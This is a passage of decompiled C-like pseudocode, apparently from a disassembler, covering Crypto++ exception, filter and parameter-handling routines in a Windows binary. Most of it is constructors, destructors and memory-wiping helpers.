    v9 = sub_13F107AD0(&v17, 0xAui64, 0i64, (const __m128i *)"\" not used", 0xAui64);
  }
  else
  {
    v18.m128i_i64[0] += 10i64;
    v7 = &v17;
    if ( v6.m128i_i64[1] >= 0x10ui64 )
      v7 = (__m128i *)v17.m128i_i64[0];
    v8 = (__m128i *)((char *)v7 + v6.m128i_i64[0]);
    sub_13F15EB00(v8, (const __m128i *)"\" not used", 0xAui64);
    v8->m128i_i8[10] = 0;
    v9 = &v17;
  }
  v21 = *v9;
  v22 = v9[1];
  v9[1].m128i_i64[0] = 0i64;
  v9[1].m128i_i64[1] = 15i64;
  v9->m128i_i8[0] = 0;
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = 6;
  sub_13F1053F0((__m128i **)(a1 + 32), &v21);
  if ( v22.m128i_i64[1] >= 0x10ui64 )
  {
    v10 = v22.m128i_i64[1] + 1;
    v11 = v21.m128i_i64[0];
    if ( (unsigned __int64)(v22.m128i_i64[1] + 1) >= 0x1000 )
    {
      v10 = v22.m128i_i64[1] + 40;
      v11 = *(_QWORD *)(v21.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v21.m128i_i64[0] - v11 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v11, v10);
  }
  if ( v18.m128i_i64[1] >= 0x10ui64 )
  {
    v12 = v18.m128i_i64[1] + 1;
    v13 = v17.m128i_i64[0];
    if ( (unsigned __int64)(v18.m128i_i64[1] + 1) >= 0x1000 )
    {
      v12 = v18.m128i_i64[1] + 40;
      v13 = *(_QWORD *)(v17.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v17.m128i_i64[0] - v13 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v13, v12);
  }
  v18 = _mm_load_si128((const __m128i *)&xmmword_13F19CCC0);
  v17.m128i_i8[0] = 0;
  if ( si128.m128i_i64[1] >= 0x10ui64 )
  {
    v14 = si128.m128i_i64[1] + 1;
    v15 = v19.m128i_i64[0];
    if ( (unsigned __int64)(si128.m128i_i64[1] + 1) >= 0x1000 )
    {
      v14 = si128.m128i_i64[1] + 40;
      v15 = *(_QWORD *)(v19.m128i_i64[0] - 8);
      if ( (unsigned __int64)(v19.m128i_i64[0] - v15 - 8) > 0x1F )
        sub_13F1682C0();
    }
    sub_13F14088C(v15, v14);
  }
  *(_QWORD *)a1 = &CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F1836E8: using guessed type void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';
// 13F19CCC0: using guessed type __int128 xmmword_13F19CCC0;

//----- (000000013F102CD0) ----------------------------------------------------
__int64 __fastcall sub_13F102CD0(__int64 a1)
{
  __int64 result; // rax
  __int64 (__fastcall ***v3)(_QWORD, __int64); // rcx
  char pExceptionObject[72]; // [rsp+30h] [rbp-48h] BYREF

  *(_QWORD *)a1 = off_13F183700;
  result = sub_13F109700(a1);
  if ( !(_DWORD)result && *(_BYTE *)(a1 + 16) && !*(_BYTE *)(a1 + 17) )
  {
    sub_13F102A80((__int64)pExceptionObject, *(const __m128i **)(a1 + 8));
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__);
  }
  v3 = *(__int64 (__fastcall ****)(_QWORD, __int64))(a1 + 24);
  if ( v3 )
    return (**v3)(v3, 1i64);
  return result;
}
// 13F109700: using guessed type __int64 __fastcall sub_13F109700(_QWORD);
// 13F183700: using guessed type __int64 (__fastcall *off_13F183700[4])();

//----- (000000013F102D40) ----------------------------------------------------
__int64 __fastcall sub_13F102D40(__int64 a1, __int64 a2)
{
  __int64 v4; // rsi
  void (__fastcall ***v5)(_QWORD, __int64); // rcx

  *(_QWORD *)a1 = off_13F183700;
  *(_QWORD *)(a1 + 8) = *(_QWORD *)(a2 + 8);
  *(_BYTE *)(a1 + 16) = *(_BYTE *)(a2 + 16);
  *(_BYTE *)(a1 + 17) = *(_BYTE *)(a2 + 17);
  *(_QWORD *)(a1 + 24) = 0i64;
  v4 = *(_QWORD *)(a2 + 24);
  *(_QWORD *)(a2 + 24) = 0i64;
  v5 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 24);
  if ( v5 )
    (**v5)(v5, 1i64);
  *(_QWORD *)(a1 + 24) = v4;
  *(_BYTE *)(a2 + 17) = 1;
  return a1;
}
// 13F183700: using guessed type __int64 (__fastcall *off_13F183700[4])();

//----- (000000013F102DC0) ----------------------------------------------------
__int64 __fastcall sub_13F102DC0(__int64 a1, char a2)
{
  void (__fastcall ***v4)(_QWORD, __int64); // rcx
  char pExceptionObject[72]; // [rsp+30h] [rbp-48h] BYREF

  *(_QWORD *)a1 = off_13F183700;
  if ( !(unsigned int)sub_13F109700(a1) && *(_BYTE *)(a1 + 16) && !*(_BYTE *)(a1 + 17) )
  {
    sub_13F102A80((__int64)pExceptionObject, *(const __m128i **)(a1 + 8));
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVParameterNotUsed_AlgorithmParametersBase_CryptoPP__);
  }
  v4 = *(void (__fastcall ****)(_QWORD, __int64))(a1 + 24);
  if ( v4 )
    (**v4)(v4, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 32i64);
  return a1;
}
// 13F109700: using guessed type __int64 __fastcall sub_13F109700(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F183700: using guessed type __int64 (__fastcall *off_13F183700[4])();

//----- (000000013F102E60) ----------------------------------------------------
__int64 __fastcall sub_13F102E60(__int64 a1, const __m128i *a2)
{
  *(_QWORD *)a1 = &std::exception::`vftable';
  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  sub_13F15E46C((__int64)&a2->m128i_i64[1], a1 + 8);
  *(_QWORD *)a1 = off_13F181CA8;
  *(_DWORD *)(a1 + 24) = a2[1].m128i_i32[2];
  sub_13F1053F0((__m128i **)(a1 + 32), a2 + 2);
  *(_QWORD *)a1 = &CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';
  return a1;
}
// 13F181CA8: using guessed type __int64 (__fastcall *off_13F181CA8[3])();
// 13F1836E8: using guessed type void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable';

//----- (000000013F102F00) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F102F00(_QWORD *a1)
{
  __int64 v2; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v4; // rcx
  void *v5; // rdx
  __int64 (__fastcall ***v6)(_QWORD, __int64); // rcx

  *a1 = &CryptoPP::FilterWithBufferedInput::`vftable';
  a1[1] = off_13F187018;
  v2 = 12i64;
  result = a1[12];
  if ( a1[11] < result )
    v2 = 11i64;
  v4 = a1[v2];
  v5 = (void *)a1[13];
  if ( v5 )
  {
    memset(v5, 0, v4);
    result = sub_13F12E550(v5);
  }
  v6 = (__int64 (__fastcall ***)(_QWORD, __int64))a1[3];
  if ( v6 )
    return (**v6)(v6, 1i64);
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F186E28: using guessed type void *CryptoPP::FilterWithBufferedInput::`vftable';
// 13F187018: using guessed type void *off_13F187018[4];

//----- (000000013F102F80) ----------------------------------------------------
__int64 __fastcall sub_13F102F80(_DWORD *a1, const __m128i *a2, __int64 a3, int a4, char a5)
{
  return sub_13F12A220(a1, a2, a3, a4, a5, 0);
}

//----- (000000013F102FA0) ----------------------------------------------------
__int64 __fastcall sub_13F102FA0(_DWORD *a1, const __m128i *a2, __int64 a3, int a4, char a5)
{
  return sub_13F12A220(a1, a2, a3, a4, a5, 1);
}

//----- (000000013F102FC0) ----------------------------------------------------
__int64 __fastcall sub_13F102FC0(__int64 a1)
{
  return *(unsigned __int8 *)(a1 + 72);
}

//----- (000000013F102FD0) ----------------------------------------------------
__int64 __fastcall sub_13F102FD0(__int64 a1)
{
  return *(_QWORD *)(a1 + 48);
}

//----- (000000013F102FE0) ----------------------------------------------------
__int64 __fastcall sub_13F102FE0(__int64 a1)
{
  return *(_QWORD *)(a1 + 56);
}

//----- (000000013F102FF0) ----------------------------------------------------
__int64 __fastcall sub_13F102FF0(__int64 a1)
{
  return *(_QWORD *)(a1 + 64);
}

//----- (000000013F103000) ----------------------------------------------------
__int64 (__fastcall *__fastcall sub_13F103000(__int64 a1))()
{
  __int64 (*v1)(void); // r8
  __int64 (__fastcall *result)(); // rax

  v1 = *(__int64 (**)(void))(*(_QWORD *)a1 + 424i64);
  result = guard_check_icall_nop;
  if ( v1 != guard_check_icall_nop )
    return (__int64 (__fastcall *)())v1();
  return result;
}
// 13F1024B0: using guessed type __int64 __fastcall guard_check_icall_nop();

//----- (000000013F103030) ----------------------------------------------------
__int64 __fastcall sub_13F103030(__int64 a1)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 448i64))(a1);
}

//----- (000000013F103040) ----------------------------------------------------
_QWORD *__fastcall sub_13F103040(_QWORD *a1, char a2)
{
  sub_13F102F00(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 144i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F103080) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F103080(_QWORD *a1)
{
  __int64 v1; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v3; // r8
  void *v4; // rdx

  v1 = 2i64;
  result = a1[2];
  if ( a1[1] < result )
    v1 = 1i64;
  v3 = a1[v1];
  v4 = (void *)a1[3];
  if ( v4 )
  {
    memset(v4, 0, v3);
    return sub_13F12E550(v4);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F1030D0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1030D0(_QWORD *a1, char a2)
{
  void (__fastcall ***v4)(_QWORD, __int64); // rcx

  *a1 = off_13F1871C8;
  a1[1] = off_13F1873B8;
  v4 = (void (__fastcall ***)(_QWORD, __int64))a1[18];
  if ( v4 )
    (**v4)(v4, 1i64);
  sub_13F102F00(a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 152i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1871C8: using guessed type __int64 (__fastcall *off_13F1871C8[62])();
// 13F1873B8: using guessed type __int64 (__fastcall *off_13F1873B8[3])();

//----- (000000013F103140) ----------------------------------------------------
__int64 __fastcall sub_13F103140(__int64 a1)
{
  char v2; // [rsp+20h] [rbp-18h]

  v2 = 1;
  return (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD, __int64, char))(**(_QWORD **)(a1 + 144) + 48i64))(
           *(_QWORD *)(a1 + 144),
           0i64,
           0i64,
           0xFFFFFFFFi64,
           v2);
}

//----- (000000013F103170) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F103170(_QWORD *a1)
{
  void (__fastcall ***v2)(_QWORD, __int64); // rcx

  *a1 = off_13F1871C8;
  a1[1] = off_13F1873B8;
  v2 = (void (__fastcall ***)(_QWORD, __int64))a1[18];
  if ( v2 )
    (**v2)(v2, 1i64);
  return sub_13F102F00(a1);
}
// 13F1871C8: using guessed type __int64 (__fastcall *off_13F1871C8[62])();
// 13F1873B8: using guessed type __int64 (__fastcall *off_13F1873B8[3])();

//----- (000000013F1031E0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1031E0(_QWORD *a1, __int64 a2, __int64 a3)
{
  _QWORD *result; // rax

  sub_13F10EE30((__int64)a1, 0);
  a1[3] = a2;
  *a1 = off_13F182988;
  a1[1] = off_13F182AF8;
  result = a1;
  a1[4] = a3;
  a1[5] = 0i64;
  return result;
}
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];

//----- (000000013F103240) ----------------------------------------------------
_QWORD *__fastcall sub_13F103240(_QWORD *a1, char a2)
{
  *a1 = off_13F182988;
  a1[1] = off_13F182AF8;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 48i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F182988: using guessed type __int64 (__fastcall *off_13F182988[46])();
// 13F182AF8: using guessed type void *off_13F182AF8[4];

//----- (000000013F103280) ----------------------------------------------------
__int64 __fastcall sub_13F103280(__int64 a1, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 64i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1032B0) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F1032B0(_QWORD *a1)
{
  __int64 v1; // rdx
  unsigned __int64 result; // rax
  unsigned __int64 v3; // r8
  void *v4; // rdx

  v1 = 5i64;
  result = a1[5];
  if ( a1[4] < result )
    v1 = 4i64;
  v3 = a1[v1];
  v4 = (void *)a1[6];
  if ( v4 )
  {
    memset(v4, 0, v3);
    return sub_13F12E550(v4);
  }
  return result;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);

//----- (000000013F103300) ----------------------------------------------------
void **__fastcall sub_13F103300(_QWORD *a1)
{
  void (__fastcall ***v2)(_QWORD, __int64); // rcx
  void **result; // rax

  v2 = (void (__fastcall ***)(_QWORD, __int64))a1[1];
  if ( v2 )
    (**v2)(v2, 1i64);
  result = &CryptoPP::NameValuePairs::`vftable';
  *a1 = &CryptoPP::NameValuePairs::`vftable';
  return result;
}
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';

//----- (000000013F103340) ----------------------------------------------------
__int64 __fastcall sub_13F103340(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v8; // rdx
  unsigned __int64 v9; // rcx
  __int64 v10; // rdx
  __int64 v11; // rdx
  __int64 v12; // rdx
  __int64 v13; // rax
  unsigned __int64 v14; // rcx
  __int64 v15; // rdx
  char v17[8]; // [rsp+20h] [rbp-51h] BYREF
  __int64 v18; // [rsp+28h] [rbp-49h]
  __int64 v19; // [rsp+30h] [rbp-41h]
  _BYTE v20[24]; // [rsp+40h] [rbp-31h]
  void **v21; // [rsp+58h] [rbp-19h] BYREF
  void (__fastcall ***v22)(_QWORD, __int64); // [rsp+60h] [rbp-11h]
  __int64 v23; // [rsp+70h] [rbp-1h]
  __int64 v24; // [rsp+80h] [rbp+Fh]

  v23 = -2i64;
  v24 = a1;
  sub_13F128E90(a1, 0i64);
  sub_13F129580(a1, a5);
  *(_QWORD *)a1 = off_13F188680;
  *(_QWORD *)(a1 + 8) = off_13F188828;
  sub_13F10EE30(a1 + 48, 0);
  *(_DWORD *)(a1 + 72) = -1;
  *(_BYTE *)(a1 + 80) = 0;
  *(_QWORD *)(a1 + 48) = off_13F185528;
  *(_QWORD *)(a1 + 56) = off_13F1856A0;
  *(_QWORD *)v20 = -1i64;
  *(_OWORD *)&v20[8] = 0i64;
  v18 = 0i64;
  v19 = 0i64;
  v17[0] = 0;
  v8 = sub_13F107650((__int64)&v21, (__int64)"InputBuffer", (__int64)v17, 1u);
  sub_13F12A860((_QWORD *)(a1 + 48), v8);
  if ( v22 )
    (**v22)(v22, 1i64);
  v21 = &CryptoPP::NameValuePairs::`vftable';
  v9 = *(_QWORD *)&v20[8];
  if ( *(_QWORD *)v20 < *(_QWORD *)&v20[8] )
    v9 = *(_QWORD *)v20;
  v10 = *(_QWORD *)&v20[16];
  if ( *(_QWORD *)&v20[16] )
  {
    memset(*(void **)&v20[16], 0, v9);
    sub_13F12E550(v10);
  }
  *(_QWORD *)a1 = off_13F188848;
  *(_QWORD *)(a1 + 8) = off_13F1889F0;
  *(__m128i *)v20 = _mm_load_si128((const __m128i *)&xmmword_13F19CCB0);
  *(_QWORD *)&v20[16] = 0i64;
  v18 = a2;
  v19 = a3;
  v17[0] = 0;
  v11 = sub_13F107650((__int64)&v21, (__int64)"InputBuffer", (__int64)v17, 1u);
  if ( *(__int64 (__fastcall ***)())a1 == off_13F188848 )
    (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)(a1 + 48) + 64i64))(a1 + 48, v11);
  else
    (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 64i64))(a1, v11);
  if ( *(__int64 (__fastcall ***)())a1 == off_13F188848 )
  {
    v13 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 336i64))(a1);
    sub_13F1114A0(a1 + 48, v13, (__int64)&qword_13F1B7008, 1);
  }
  else
  {
    LOBYTE(v12) = 1;
    (*(void (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 400i64))(a1, v12);
  }
  if ( v22 )
    (**v22)(v22, 1i64);
  v21 = &CryptoPP::NameValuePairs::`vftable';
  v14 = *(_QWORD *)&v20[8];
  if ( *(_QWORD *)v20 < *(_QWORD *)&v20[8] )
    v14 = *(_QWORD *)v20;
  v15 = *(_QWORD *)&v20[16];
  if ( *(_QWORD *)&v20[16] )
  {
    memset(*(void **)&v20[16], 0, v14);
    sub_13F12E550(v15);
  }
  return a1;
}
// 13F10354E: variable 'v12' is possibly undefined
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F182E30: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 13F185528: using guessed type __int64 (__fastcall *off_13F185528[47])();
// 13F1856A0: using guessed type void *off_13F1856A0[3];
// 13F188680: using guessed type __int64 (__fastcall *off_13F188680[53])();
// 13F188828: using guessed type void *off_13F188828[4];
// 13F188848: using guessed type __int64 (__fastcall *off_13F188848[53])();
// 13F1889F0: using guessed type void *off_13F1889F0[4];
// 13F19CCB0: using guessed type __int128 xmmword_13F19CCB0;
// 13F1B7008: using guessed type __int64 qword_13F1B7008;
// 13F103340: using guessed type char var_A0[8];

//----- (000000013F103560) ----------------------------------------------------
_QWORD *__fastcall sub_13F103560(_QWORD *a1, char a2)
{
  void (__fastcall ***v4)(_QWORD, __int64); // rcx

  *a1 = off_13F188680;
  a1[1] = off_13F188828;
  v4 = (void (__fastcall ***)(_QWORD, __int64))a1[3];
  if ( v4 )
    (**v4)(v4, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 112i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F188680: using guessed type __int64 (__fastcall *off_13F188680[53])();
// 13F188828: using guessed type void *off_13F188828[4];

//----- (000000013F1035F0) ----------------------------------------------------
__int64 __fastcall sub_13F1035F0(__int64 a1, __int64 a2)
{
  __int64 v3; // rcx
  __int64 v4; // rax
  unsigned __int64 v5; // rcx
  __int64 v6; // rdx
  char v8[16]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v9; // [rsp+40h] [rbp-28h]
  unsigned __int64 v10; // [rsp+48h] [rbp-20h]
  void *v11; // [rsp+50h] [rbp-18h]

  v3 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 8i64))(a1, v8);
  v4 = sub_13F113780(v3);
  sub_13F112A00(a2, v4);
  v5 = v10;
  if ( v9 < v10 )
    v5 = v9;
  v6 = (__int64)v11;
  if ( v11 )
  {
    memset(v11, 0, 8 * v5);
    sub_13F12E4D0(v6);
  }
  return a2;
}
// 13F1035F0: using guessed type char var_38[16];

//----- (000000013F103680) ----------------------------------------------------
__int64 __fastcall sub_13F103680(__int64 a1, __int64 a2)
{
  __int64 v3; // rcx
  __int64 v4; // rax
  unsigned __int64 v5; // rcx
  __int64 v6; // rdx
  char v8[16]; // [rsp+30h] [rbp-38h] BYREF
  unsigned __int64 v9; // [rsp+40h] [rbp-28h]
  unsigned __int64 v10; // [rsp+48h] [rbp-20h]
  void *v11; // [rsp+50h] [rbp-18h]

  v3 = (*(__int64 (__fastcall **)(__int64, char *))(*(_QWORD *)a1 + 16i64))(a1, v8);
  v4 = sub_13F113780(v3);
  sub_13F112A00(a2, v4);
  v5 = v10;
  if ( v9 < v10 )
    v5 = v9;
  v6 = (__int64)v11;
  if ( v11 )
  {
    memset(v11, 0, 8 * v5);
    sub_13F12E4D0(v6);
  }
  return a2;
}
// 13F103680: using guessed type char var_38[16];

//----- (000000013F103710) ----------------------------------------------------
__int64 __fastcall sub_13F103710(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  (*(void (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 56i64))(a1, a2, a4);
  return a2;
}

//----- (000000013F103730) ----------------------------------------------------
__int64 __fastcall sub_13F103730(__int64 a1, __int64 a2)
{
  (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 24i64))(a1);
  return a2;
}

//----- (000000013F103750) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F103750(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        __int64 a5,
        __int64 a6,
        char a7)
{
  return sub_13F10E240(a2, a3, a4, a5, a6, 0i64, 0i64, a7, 0);
}

//----- (000000013F1037B0) ----------------------------------------------------
bool __fastcall sub_13F1037B0(__int64 a1, unsigned __int8 *a2)
{
  return (unsigned int)sub_13F16A230(a2, (__int64)"EncodingParameters") == 0;
}

//----- (000000013F1037D0) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F1037D0(_QWORD *a1))()
{
  __int64 (__fastcall **result)(); // rax
  __int64 v3; // rcx
  unsigned __int64 v4; // rdx

  result = off_13F181EC8;
  *a1 = off_13F181EC8;
  v3 = a1[1];
  if ( v3 )
  {
    v4 = (a1[3] - v3) & 0xFFFFFFFFFFFFFFFCui64;
    if ( v4 >= 0x1000 )
    {
      v4 += 39i64;
      if ( (unsigned __int64)(v3 - *(_QWORD *)(v3 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v3 = *(_QWORD *)(v3 - 8);
    }
    sub_13F14088C(v3, v4);
    result = 0i64;
    a1[1] = 0i64;
    a1[2] = 0i64;
    a1[3] = 0i64;
  }
  return result;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();

//----- (000000013F103840) ----------------------------------------------------
_QWORD *__fastcall sub_13F103840(_QWORD *a1, char a2)
{
  __int64 v4; // rcx
  unsigned __int64 v5; // rdx

  *a1 = off_13F181EC8;
  v4 = a1[1];
  if ( v4 )
  {
    v5 = (a1[3] - v4) & 0xFFFFFFFFFFFFFFFCui64;
    if ( v5 >= 0x1000 )
    {
      v5 += 39i64;
      if ( (unsigned __int64)(v4 - *(_QWORD *)(v4 - 8) - 8) > 0x1F )
        sub_13F1682C0();
      v4 = *(_QWORD *)(v4 - 8);
    }
    sub_13F14088C(v4, v5);
    a1[1] = 0i64;
    a1[2] = 0i64;
    a1[3] = 0i64;
  }
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 32i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F181EC8: using guessed type __int64 (__fastcall *off_13F181EC8[2])();

//----- (000000013F1038F0) ----------------------------------------------------
char __fastcall sub_13F1038F0(__int64 a1, __int64 a2)
{
  sub_13F10BF80(a2);
  return 0;
}

//----- (000000013F103910) ----------------------------------------------------
char __fastcall sub_13F103910(__int64 a1, __int64 *a2)
{
  sub_13F10CAA0(a2);
  return 0;
}

//----- (000000013F103930) ----------------------------------------------------
_QWORD *__fastcall sub_13F103930(_QWORD *a1, char a2)
{
  *a1 = off_13F186288;
  *(_QWORD *)((char *)a1 + *(int *)(a1[1] + 4i64) + 8) = off_13F1862D8;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 24i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F186288: using guessed type __int64 (__fastcall *off_13F186288[10])();
// 13F1862D8: using guessed type void *off_13F1862D8[12];

//----- (000000013F1039B0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1039B0(_QWORD *a1, char a2)
{
  *a1 = off_13F186338;
  a1[1] = off_13F186398;
  *(_QWORD *)((char *)a1 + *(int *)(a1[2] + 4i64) + 16) = off_13F1863A8;
  sub_13F1315A0(a1 + 3);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 112i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F186338: using guessed type __int64 (__fastcall *off_13F186338[12])();
// 13F186398: using guessed type __int64 (__fastcall *off_13F186398[2])();
// 13F1863A8: using guessed type void *off_13F1863A8[12];

//----- (000000013F103A20) ----------------------------------------------------
__int64 __fastcall sub_13F103A20(__int64 a1, __int64 a2)
{
  sub_13F112A00(a2, a1 + 24);
  return a2;
}

//----- (000000013F103A40) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F103A40(__int64 a1, __int64 a2))()
{
  return sub_13F10B730(a1 + 120, a2);
}

//----- (000000013F103A50) ----------------------------------------------------
__int64 __fastcall sub_13F103A50(__int64 a1, __int64 *a2)
{
  return sub_13F10C3E0(a1 + 120, a2);
}

//----- (000000013F103A60) ----------------------------------------------------
__int64 (__fastcall **__fastcall sub_13F103A60(__int64 a1, __int64 a2))()
{
  return sub_13F10B730(a1 - 392, a2);
}

//----- (000000013F103A80) ----------------------------------------------------
_QWORD *__fastcall sub_13F103A80(__int64 a1, _QWORD *a2)
{
  sub_13F1263C0(a1, a2);
  return a2;
}

//----- (000000013F103AA0) ----------------------------------------------------
_QWORD *__fastcall sub_13F103AA0(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  unsigned __int64 v5; // rcx
  void *v6; // r8
  void (__fastcall ***v7)(_QWORD, __int64); // rcx

  v4 = 12i64;
  if ( a1[11] < a1[12] )
    v4 = 11i64;
  v5 = a1[v4];
  v6 = (void *)a1[13];
  if ( v6 )
  {
    memset(v6, 0, v5);
    sub_13F12E550(v6);
  }
  v7 = (void (__fastcall ***)(_QWORD, __int64))a1[3];
  if ( v7 )
    (**v7)(v7, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 112i64);
  return a1;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F103B30) ----------------------------------------------------
_QWORD *__fastcall sub_13F103B30(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  unsigned __int64 v5; // rcx
  void *v6; // r8
  void (__fastcall ***v7)(_QWORD, __int64); // rcx

  v4 = 11i64;
  if ( a1[10] < a1[11] )
    v4 = 10i64;
  v5 = a1[v4];
  v6 = (void *)a1[12];
  if ( v6 )
  {
    memset(v6, 0, v5);
    sub_13F12E550(v6);
  }
  v7 = (void (__fastcall ***)(_QWORD, __int64))a1[3];
  if ( v7 )
    (**v7)(v7, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 104i64);
  return a1;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F103BC0) ----------------------------------------------------
_QWORD *__fastcall sub_13F103BC0(_QWORD *a1, char a2)
{
  __int64 v4; // rdi
  unsigned __int64 v5; // rcx
  void *v6; // r8
  __int64 v7; // rcx
  void *v8; // rdx
  void (__fastcall ***v9)(_QWORD, __int64); // rcx

  v4 = 12i64;
  if ( a1[11] < a1[12] )
    v4 = 11i64;
  v5 = a1[v4];
  v6 = (void *)a1[13];
  if ( v6 )
  {
    memset(v6, 0, v5);
    sub_13F12E550(v6);
  }
  v7 = 8i64;
  if ( a1[7] < a1[8] )
    v7 = 7i64;
  v8 = (void *)a1[9];
  if ( v8 )
  {
    memset(v8, 0, a1[v7]);
    sub_13F12E550(v8);
  }
  v9 = (void (__fastcall ***)(_QWORD, __int64))a1[3];
  if ( v9 )
    (**v9)(v9, 1i64);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 128i64);
  return a1;
}
// 13F12E550: using guessed type __int64 __fastcall sub_13F12E550(_QWORD);
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F103C80) ----------------------------------------------------
_QWORD *__fastcall sub_13F103C80(_QWORD *a1, __int64 a2)
{
  __int64 v4; // rdi
  _QWORD *v5; // rbx
  __int64 v6; // rbx
  _QWORD *v7; // rdi
  __int64 v8; // rsi
  void (__fastcall ***v9)(_QWORD, __int64); // rcx
  void (__fastcall ***v10)(_QWORD, __int64); // rcx
  __int64 v11; // rbx
  __int64 v12; // rax
  void **v14; // [rsp+50h] [rbp-68h] BYREF
  void (__fastcall ***v15)(_QWORD, __int64); // [rsp+58h] [rbp-60h]
  char v16[8]; // [rsp+68h] [rbp-50h] BYREF
  void (__fastcall ***v17)(_QWORD, __int64); // [rsp+70h] [rbp-48h]
  int v18; // [rsp+80h] [rbp-38h] BYREF
  _QWORD *v19; // [rsp+88h] [rbp-30h]

  v18 = 72;
  v4 = sub_13F14059C(112i64);
  v19 = (_QWORD *)v4;
  sub_13F15EF70(v4, 0, 0x70ui64);
  v5 = (_QWORD *)sub_13F14059C(128i64);
  sub_13F15EF70((__int64)v5, 0, 0x80ui64);
